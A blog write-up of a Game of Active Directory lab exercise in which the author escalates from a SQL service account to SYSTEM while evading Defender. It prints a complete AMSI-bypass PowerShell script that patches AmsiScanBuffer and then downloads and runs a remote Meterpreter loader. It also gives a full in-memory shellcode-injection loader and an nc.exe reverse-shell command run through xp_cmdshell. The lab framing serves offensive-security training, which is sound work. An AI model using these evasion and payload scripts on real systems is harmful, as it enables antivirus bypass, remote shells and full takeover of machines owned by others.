---
title: "GOAD (Game of Active Directory) NHA #3 - Bypassing Defender and Achieving SYSTEM on SQL Host"
date: 2025-09-10T16:22:03+02:00
draft: false
categories:
- CTF
- writeup
- Active Directory
- GOAD
- Windows
- 2025
- Defender Bypass
- Bypass
- Defender
- Evasion
- Antivirus
cover:
  image: /images/goad/logo_GOAD.png
---

After achieving RCE on the **SQL** host I proceeded to check the user's privileges.

{{< figure src="/images/goad/3-amsi-bypass/mssql_whoami_priv.png" >}}
As this is a service account it has the `SeImpersonatePrivilege` Privilege Enabled. This is a direct pwn using the Potato binaries.

Knowing the way I will get `NT AUTHORITY\SYSTEM` in the **SQL** host I proceeded to check if **Defender** is active.
{{< figure src="/images/goad/3-amsi-bypass/mssql_check_defender.png" >}}
I also confirmed I can access kali from the Windows environment with a HTTP request:
{{< figure src="/images/goad/3-amsi-bypass/mssql_iwr.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/mssql_kali_iwr_result.png" >}}


I will be using 3 approaches to bypass Defender and be able to do the privilege escalation to achieve SYSTEM:
- AMSI Bypass using PowerShell
- Creating an indetectable PE with ShhhLoader tool
- DLL SideLoading with ShhhLoader


I will be using Metasploit in the 3 approaches, and nc with RoguePotato in the 1st one to practice OSCP-like methodology.

# AMSI Bypass using PowerShell
As we have PowerShell command execution, we can use a powershell script to bypass AMSI and load our preferred binary, all in-memory, successfully bypassing Defender. If you don't know what AMSI is, I recommend you to do the Holo Network in TryHackme, where it explains all those techniques I will be using and the theoretical concepts you need to know. To do a bery brief resume, AMSI is the real-time protection of defender for powershell, which blocks malicious code execution. 

I started a meterpreter listener in my kali host:
{{< figure src="/images/goad/3-amsi-bypass/msf_handler_config.png" >}}


The first thing we need to do is to get a powershell process. I used `nc.exe` to send a reverse shell to my kali host. I am using the `$env:temp` directory, which have write permissions, to store the `nc.exe` binary.
{{< figure src="/images/goad/3-amsi-bypass/mssql_iwr_nc.exe_mssql.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/mssql_iwr_nc.exe.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/mssql_dir_temp_nc.exe.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/mssql_echo_env_temp.png" >}}

I started a nc listener on port 4444 and launched nc.exe passing powershell.exe:
{{< figure src="/images/goad/3-amsi-bypass/mssql_nc_powershell_32.png" >}}

I checked if the current process is 32-bits or 64-bits. In this case it is 32 bits. 

{{< figure src="/images/goad/3-amsi-bypass/nc_process_x86.png" >}}
As we can see this is a x86 process. This won't work for the Meterpreter loader, so I spawned a 64-bits PowerShell Process.

I used the same command but changing the PowerShell binary:
`xp_cmdshell C:\Windows\SERVIC~1\NETWOR~1\AppData\Local\Temp\nc.exe 192.168.1.41 4444 -e c:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe`

This worked perfectly and I got the 64-bits process. I then used `iex` to execute the AMSI Bypass Script and the Meterpreter loader script, obtaining the meterpreter reverse shell.

When I reproduced the exactly same steps to do the captures to upload it to the blog, Defender suddenly blocked the `nc.exe` binary, so I had to find a workaround to do the same.

Now I can't execute `iex` nor `nc.exe` within `mssqlclient`. I started a smbserver using `impacket-smbserver` to be able to execute a script locally without `iex`. Then I used `net use` to access the share and I modified the AMSI bypass script to output if the process is 64 or 32 bits (just for debug purposes) and at the end, after bypassing AMSI, the iex command to execute the Meterpreter loader script.

**`impacket-smbserver`**:
{{< figure src="/images/goad/3-amsi-bypass/smbserver.png" >}}

{{< figure src="/images/goad/3-amsi-bypass/net_use_X.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/dir_x.png" >}}

The resulting AMSI Bypass script is the following:
```powershell
# DEBUG: 64-bit or 32-bit process
(Get-Process -Id $PID).StartInfo.EnvironmentVariables["PROCESSOR_ARCHITECTURE"]

# Obfuscated
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('notExisTingSignAtuRe', [system.runtime.interopservices.marshal])

$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
$test = [Win32.Kernel32]
$test::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[notExisTingSignAtuRe]::copy($buf, 0, $BufferAddress, 6);

# Execute Meterpreter loader without restrictions
iex(new-object net.webclient).downloadstring('http://192.168.1.41/Metasploit-Loader-Powershell.ps1')
```

The Meterpreter loader script is the following:
```powershell
# Use msfvenom -f ps1 to retrieve the shellcode for your payload
[Byte[]] $shellcode = 0xfc,0x48

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

The execution worked perfectly:
{{< figure src="/images/goad/3-amsi-bypass/mssql_amsi_bypass.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/mssql_amsi_bypass_iex_result.png" >}}
{{< figure src="/images/goad/3-amsi-bypass/meterpreter_shell.png" >}}

I then used `getsystem` to exploit the `SeImpersonatePrivilege` and obtain `NT AUTHORITY\SYSTEM`.
{{< figure src="/images/goad/3-amsi-bypass/meterpreter_getsystem.png" >}}

I also migrated the process to avoid issues.
{{< figure src="/images/goad/3-amsi-bypass/migrate.png" >}}

